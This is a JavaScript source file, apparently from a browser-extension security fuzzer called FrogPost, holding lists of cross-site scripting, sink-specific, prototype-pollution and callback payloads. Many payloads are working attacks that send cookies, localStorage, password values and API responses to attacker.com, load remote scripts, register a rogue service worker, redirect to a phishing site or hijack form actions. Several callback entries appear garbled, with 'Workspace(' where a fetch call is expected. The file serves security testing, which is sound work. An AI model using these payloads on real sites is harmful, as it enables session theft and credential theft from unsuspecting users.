/**
 * FrogPost Extension
 * Originally Created by thisis0xczar/Lidor JFrog AppSec Team
 * Refined on: 2025-04-03
 */
window.FuzzingPayloads = {

    XSS: {
        html: [
            '<img src=x onerror=alert("XSS_HTML_1")>',
            '<svg onload=console.log("XSS_HTML_2")>',
            '<script>console.log("XSS_HTML_3")</script>',
            '"><img src=x onerror=console.log("XSS_HTML_4")>',
            '<iframe src="javascript:alert(\'XSS_HTML_5\')"></iframe>',
            '<details open ontoggle="alert(\'XSS_HTML_6\')">',
            '<video><source onerror="alert(\'XSS_HTML_7\')">',
            '<body onpageshow="alert(\'XSS_HTML_8\')">',
            '<marquee onstart="console.log(\'XSS_HTML_9\')">',
            '<div onmouseover="console.log(\'XSS_HTML_10\')">Hover</div>',
            '<input autofocus onfocus="alert(\'XSS_HTML_11\')">',
            '<select autofocus onfocus="alert(\'XSS_HTML_12\')"></select>',
            '<textarea autofocus onfocus="alert(\'XSS_HTML_13\')"></textarea>',
            '<keygen autofocus onfocus="alert(\'XSS_HTML_14\')">',
            '<isindex type=image src=1 onerror=alert(\'XSS_HTML_15\')>',
            '<img src="x:gif" onerror="alert(\'XSS_HTML_16\')">',
            '<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" onerror="alert(\'XSS_HTML_17\')">', // Valid image, onerror fires if blocked
            '<% script>alert("XSS_HTML_18")</% script>',
            '<scr<script>ipt>console.log("XSS_HTML_19")</scr</script>ipt>', // Broken tags
            '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,95,72,84,77,76,95,50,48,39,41))">', //fromCharCode
            '<math><mtext><table><mglyph><style><script>console.log("PXSS_HTML_8")</script>',
            '<<img src="x" onerror="console.log(\'PXSS_HTML_9\')//">>',
            '<p title="onerror=console.log(\'PXSS_HTML_10\')//"><img src="x" onerror=console.log(\'PXSS_HTML_10\') />'
        ],
        script: [
            'con\\u0073ole.log("PXSS_SCRIPT_1")',
            'window["con"+"sole"]["l"+"og"]("PXSS_SCRIPT_2")',
            'setTimeout("console.log(\'PXSS_SCRIPT_3\')")',
            'eval(String.fromCharCode(99,111,110,115,111,108,101,46,108,111,103,40,34,80,88,83,83,95,83,67,82,73,80,84,95,52,34,41))',
            '`${console.log("PXSS_SCRIPT_5")}`',
            'alert(String.fromCharCode(80,88,83,83,95,83,67,82,73,80,84,95,54))',
            'self["ev"+"al"]("con"+"sole"+"."+"log(\'PXSS_SCRIPT_7\')")',
            '(()=>{}).constructor("return console.log(\'PXSS_SCRIPT_8\')")();',
            'globalThis[\'eva\'+\'l\'](\'console.log(\\"PXSS_SCRIPT_9\\")\')',
            '[].filter.constructor("return console.log(\'PXSS_SCRIPT_10\')")()'
        ],
        url: [
            'javascript:void(con%73ole.log("PXSS_URL_1"))',
            'javascript://comment%0Aconsole.log("PXSS_URL_2")',
            'javascript:void%20console.log("PXSS_URL_3")',
            'java&#x73;cript:console.log("PXSS_URL_4")', // HTML entity
            'javascript:([,"PXSS_URL_5"].find(alert))', // Array find
            '  javascript:console.log("PXSS_URL_6")', // Leading space
            'javascrip&#116;:console.log("PXSS_URL_7")', // Numeric entity
            '\u006aavascript:console.log("PXSS_URL_8")' // Unicode escape
        ]
    },

    SINK_SPECIFIC: {
        eval: [
            'console.log(document.domain + " - EVAL_1")',
            '(function(){return console.log(document.location + " - EVAL_2")})()',
            'console.log("Evaluating code at "+document.URL + " - EVAL_3")',
            'alert("FrogPost_Eval_4")',
            'fetch("/api/user").then(r=>r.json()).then(d=>fetch("https://attacker.com/?eval_data="+encodeURIComponent(JSON.stringify(d))))',
            '(new Image()).src = "https://attacker.com/?eval_cookie="+document.cookie',
            'Array.from(document.querySelectorAll("input[type=password]")).map(e => e.value).join("||")', // Return value might be useful
            'document.write("<img src=\\"https://attacker.com/?eval_write="+document.cookie+"\\">")',
            'JSON.stringify(Object.keys(localStorage).map(k => ({key: k, value: localStorage.getItem(k)})))'
        ],
        innerHTML: [
            '<img src=x onerror=console.log(document.domain + " - HTML_1")>',
            '<svg onload=console.log(document.cookie + " - HTML_2")>',
            '<script>alert("FrogPost_HTML_3")</script>',
            '<iframe src="javascript:alert(document.location + \' - HTML_4\')"></iframe>',
            '<img src=1 onerror="console.log(\'innerHTML at \'+document.URL+\' - HTML_5\')">',
            '<form><input name=csrf value=html6 formaction="javascript:fetch(\'https://attacker.com/?html_form=\'+document.cookie)">',
            '<video><source onerror="fetch(\'/api/user\').then(r=>r.json()).then(d=>fetch(\'https://attacker.com/?html_video=\'+btoa(JSON.stringify(d))))">',
            '<details open ontoggle="navigator.sendBeacon(\'https://attacker.com/?html_details\', document.cookie)">',
            '<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9hdHRhY2tlci5jb20vP2h0bWxfb2JqZWN0PScrdG9wLmxvY2F0aW9uLmhyZWYpPC9zY3JpcHQ+"></object>'
        ],
        document_write: [
            '<script>console.log(document.domain + " - WRITE_1")</script>',
            '<img src=x onerror=console.log(document.cookie + " - WRITE_2")>',
            '<script>alert("FrogPost_WRITE_3")</script>',
            '<img src="invalid" onerror="console.log(document.location + \' - WRITE_4\')">',
            'document.write test WRITE_5 at '+document.URL,
            '<iframe src="javascript:fetch(\'/api/sensitive\').then(r=>r.text()).then(t=>location=\'https://attacker.com/?write_iframe=\'+encodeURIComponent(t))"></iframe>',
            '<script>window.addEventListener("message",e=>fetch("https://attacker.com/?write_listener="+encodeURIComponent(JSON.stringify(e.data))))</script>',
            '<applet code="javascript:console.log(document.domain + \' - WRITE_8\')">',
            '<meta http-equiv="refresh" content="0;url=data:text/html,<script>navigator.sendBeacon(\'https://attacker.com/?write_meta\',document.cookie)</script>">'
        ],
        setTimeout: [ // Note: Payloads should be strings for string-based setTimeout/setInterval
            'console.log(document.domain + " - TIMEOUT_1")',
            'console.log(document.cookie + " - TIMEOUT_2")',
            'alert("FrogPost_TIMEOUT_3")',
            '(function(){console.log(document.location + " - TIMEOUT_4")})()',
            'console.log("setTimeout at "+document.URL + " - TIMEOUT_5")',
            'fetch("/api/user").then(r=>r.json()).then(d=>new Image().src="https://attacker.com/?timeout_img="+btoa(JSON.stringify(d)))',
            'Array.from(document.forms).forEach(f=>console.log(f.action)) // TIMEOUT_7',
            'localStorage.setItem("pwned_timeout","yes"); console.log(localStorage.getItem("pwned_timeout")) // TIMEOUT_8',
            '[].filter.constructor("debugger")() // TIMEOUT_9'
        ],
        setInterval: [ // Note: Payloads should be strings for string-based setTimeout/setInterval
            'console.log(document.domain + " - INTERVAL_1")',
            'console.log(document.cookie + " - INTERVAL_2")',
            'alert("FrogPost_INTERVAL_3")',
            '(function(){console.log(document.location + " - INTERVAL_4")})()',
            'console.log("setInterval at "+document.URL + " - INTERVAL_5")',
            'var pw=document.querySelector("input[type=password]"); if(pw)fetch("https://attacker.com/?interval_pw="+pw.value)',
            'navigator.sendBeacon("https://attacker.com/?interval_beacon", JSON.stringify({loc:location.href,cookies:document.cookie}))',
            'function x(){document.querySelectorAll("form").forEach(f=>f.action="https://attacker.com/?interval_form")};x()',
            'window.top.location="https://phishing-site.com/?from_interval="+encodeURIComponent(location.href)'
        ],
        location_href: [ // Typically need javascript: prefix if setting directly
            'javascript:console.log(document.domain + " - LOC_HREF_1")',
            'javascript:console.log(document.cookie + " - LOC_HREF_2")',
            'javascript:alert("FrogPost_LOC_HREF_3")',
            'javascript:console.log("location.href at "+document.URL + " - LOC_HREF_4")',
            'javascript:fetch("/api/sensitive").then(r=>r.text()).then(t=>navigator.sendBeacon("https://attacker.com/?loc_href_beacon",t)); void(0);',
            'javascript:var x=document.createElement("script");x.src="https://attacker.com/x.js?loc_href";document.body.appendChild(x);void 0',
            'javascript:(function(){var i=document.createElement("iframe");i.src="https://attacker.com/?loc_href_iframe";i.style.opacity=0;i.style.position="absolute";document.body.appendChild(i)})(); void(0);',
            'javascript:window.addEventListener("message",m=>fetch("https://attacker.com/?loc_href_listener="+btoa(JSON.stringify(m.data)))); void(0);',
            'javascript:document.write("<script>window.top.location=\'https://attacker.com/?loc_href_write=\'+encodeURIComponent(document.referrer)</script>")',
            'data:text/html,<script>navigator.serviceWorker.register("https://attacker.com/sw_loc_href.js")</script>' // Data URL
        ]
    },

    PROTOTYPE_POLLUTION: [
        // Basic __proto__
        { field: '__proto__.polluted_frog_1', value: true },
        // Constructor prototype
        { field: 'constructor.prototype.polluted_frog_2', value: true },
        // Common property names often used in checks or logic
        { field: '__proto__.isAdmin', value: true },
        { field: '__proto__.is_admin', value: true },
        { field: '__proto__.admin', value: true },
        { field: '__proto__.enabled', value: true }
    ],

    // Placeholders for Callback Payloads - %%CALLBACK_URL%% will be replaced dynamically
    CALLBACK_URL: [
        `Workspace('%%CALLBACK_URL%%?d1='+document.cookie)`,
        `<script src="%%CALLBACK_URL%%?d2=scripttag"></script>`, // Might be blocked by CSP
        `<img src="%%CALLBACK_URL%%?d3='+document.cookie+'">`,
        `navigator.sendBeacon('%%CALLBACK_URL%%', JSON.stringify({cookie: document.cookie, location: document.location.href, referrer: document.referrer}))`,
        `var x=new XMLHttpRequest();x.open('GET','%%CALLBACK_URL%%?d5='+btoa(document.cookie));x.send()`,
        `new Image().src='%%CALLBACK_URL%%?d6='+document.cookie`,
        `document.location='%%CALLBACK_URL%%?d7='+document.domain`,
        `<iframe src="%%CALLBACK_URL%%#d8='+document.cookie" style="display:none;"></iframe>`,
        `Workspace('%%CALLBACK_URL%%', {method:'POST', body:localStorage.getItem('userToken') || 'no_token'})`,
        `WebSocket('wss://'+new URL('%%CALLBACK_URL%%').host+'/?d10='+document.cookie)`, // Extracts host
        `window.open('%%CALLBACK_URL%%?d11='+document.cookie)`,
        `$.get('%%CALLBACK_URL%%?d12='+document.cookie)`, // jQuery specific
        `Workspace('%%CALLBACK_URL%%?d13=fetch_test').then(r => console.log('Callback fetch status: '+r.status))`,
        `<form action="%%CALLBACK_URL%%" method="post"><input name="data" value="form_submit"><button type="submit"></button></form><script>document.forms[document.forms.length-1].submit();</script>`
    ]
};
